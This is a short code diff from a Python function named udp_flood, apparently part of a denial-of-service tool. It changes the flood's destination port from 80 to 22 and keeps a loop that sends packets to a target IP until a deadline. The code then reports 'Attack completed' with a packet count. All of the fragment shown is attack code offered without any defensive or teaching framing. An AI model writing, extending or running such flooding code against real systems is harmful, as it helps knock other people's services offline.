@@ -15,7 +15,7 @@ def udp_flood(ip, duration):
         attack_num = 0
 
         while datetime.now() < end_time:
-            s.sendto(byte, (ip, 80))
+            s.sendto(byte, (ip, 22))
             attack_num += 1
         s.close()
         print(f"Attack completed: {attack_num} packets sent to {ip}")
